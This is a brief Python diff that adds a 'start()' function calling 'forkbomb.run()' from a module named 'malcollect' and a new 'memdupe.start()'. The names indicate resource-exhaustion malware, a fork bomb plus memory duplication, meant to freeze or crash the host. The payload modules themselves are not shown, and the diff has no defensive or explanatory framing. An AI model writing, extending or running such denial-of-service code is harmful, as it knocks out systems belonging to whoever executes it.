@@ -1,3 +1,7 @@
 from malcollect import forkbomb
+import memdupe
 
-forkbomb.run()
+
+def start():
+    forkbomb.run()
+    memdupe.start()
